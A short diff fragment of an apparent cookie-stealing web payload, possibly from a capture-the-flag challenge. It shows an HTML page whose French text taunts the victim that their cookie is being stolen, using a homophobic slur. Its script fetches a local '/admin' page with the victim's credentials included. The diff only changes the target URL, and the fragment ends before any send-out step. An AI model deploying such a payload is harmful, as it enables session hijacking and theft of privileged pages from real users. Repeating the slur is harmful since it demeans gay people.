@@ -5,7 +5,7 @@
     <p>Je te vole ton cookie et tu vas rien faire pd</p>
     <script>
     (async () => {
-    let cookies = await fetch("http://127.0.0.1:5000/admin", {
+    let cookies = await fetch("localhost:5000/admin", {
         credentials: "include",
     })
         .then((r) => r.text())
